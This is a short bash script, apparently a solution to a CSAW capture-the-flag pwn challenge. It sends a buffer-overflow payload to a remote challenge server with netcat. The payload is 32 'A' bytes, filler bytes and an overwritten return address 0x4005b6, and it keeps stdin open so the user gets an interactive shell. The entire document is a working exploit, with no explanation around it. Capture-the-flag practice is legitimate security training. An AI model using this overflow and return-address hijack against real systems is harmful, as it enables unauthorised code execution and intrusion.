#! /bin/bash

(python -c "print 'A'*32+'BBBBCCCC'+'\xb6\x05\x40\x00\x00\x00\x00\x00\xaa'"; cat) | nc pwn.chal.csaw.io 9001

